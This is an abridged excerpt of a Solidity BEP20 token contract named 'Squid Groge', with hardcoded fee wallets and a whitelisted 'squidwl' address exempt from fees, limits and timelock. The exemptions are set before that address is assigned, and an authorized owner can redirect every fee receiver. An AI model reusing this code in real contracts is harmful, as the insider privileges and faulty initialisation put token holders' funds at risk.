...
contract SquidGroge is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Squid Groge";
    string constant _symbol = "SQUIDG";
    uint8 constant _decimals = 2;

    uint256 _totalSupply = 100 * 10**10 * 10**_decimals; // 1 Trillion Total Supply
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeExempt[squidwl] = true;
        isTxLimitExempt[squidwl] = true;
        isTimelockExempt [squidwl] = true;
        ...
        autoLiquidityReceiver = 0xDB06f72030bd455980F65fd17C0B50bC3988cCa3;
        marketingFeeReceiver = 0xDa37B79C46cE48E25563a8430aA7f046274409c3;
        teamFeeReceiver = 0x8a8d1b071Fe94a6865D934B770F0dfE853c0A745;
        charityFeeReceiver = 0xDB06f72030bd455980F65fd17C0B50bC3988cCa3;
        squidwl = 0x47aD873868FD5e0fd548C08E0Ae1eE43f4A1902A;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != teamFeeReceiver  && recipient != autoLiquidityReceiver && recipient != burnFeeReceiver && recipient != squidwl){
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _burnFeeReceiver, address _charityFeeReceiver, address _squidwl) external authorized {
